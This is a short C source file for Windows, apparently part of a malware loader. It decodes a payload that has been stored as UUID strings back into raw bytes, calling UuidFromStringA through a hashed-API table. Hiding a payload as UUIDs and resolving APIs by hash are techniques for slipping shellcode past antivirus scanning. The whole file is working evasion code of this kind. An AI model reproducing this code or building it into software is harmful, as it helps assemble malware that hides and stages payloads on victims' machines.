#include <Windows.h>
#include "Common.h"
#include "Debug.h"

extern API_HASHING g_Api;

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* pData, OUT SIZE_T* sSize) {

	PBYTE								pBuffer						= NULL,
										TmpBuffer					= NULL;
	SIZE_T								sBuffSize					= NULL;
	RPC_STATUS							STATUS						= NULL;


	sBuffSize = NmbrOfElements * 16;

	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
#ifdef DEBUG
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < NmbrOfElements; i++) {
		
		if ((STATUS = g_Api.pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
#ifdef DEBUG
			PRINTA("[!] UuidFromStringA Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		 }

		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*pData	= pBuffer;
	*sSize	= sBuffSize;

	return TRUE;
}